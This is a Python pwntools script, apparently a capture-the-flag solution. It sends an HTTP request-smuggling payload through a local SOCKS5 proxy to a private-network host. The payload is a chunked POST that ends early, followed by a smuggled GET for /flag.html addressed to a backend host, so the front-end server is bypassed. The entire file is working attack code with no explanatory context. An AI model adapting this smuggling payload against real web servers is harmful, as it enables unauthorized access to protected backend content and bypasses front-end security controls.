import socks
import socket
from pwn import *

context.log_level = 'debug'

# Set SOCKS5 proxy
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 8123)
socket.socket = socks.socksocket

# Target
target_host = "192.168.2.199"
target_port = 56698
frontend_host = "14828"
backend_host = "14848"

# Smuggled request
smuggled_request = (
    f"GET /flag.html HTTP/1.1\r\n"
    f"Host: {backend_host}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

# Main request with Transfer-Encoding
payload = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {frontend_host}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"0\r\n"
    f"\r\n"
    f"{smuggled_request}"
)

# Send payload
remote = remote(target_host, target_port)
remote.send(payload.encode())
response = remote.recvall(timeout=5).decode(errors="ignore")

print(response)
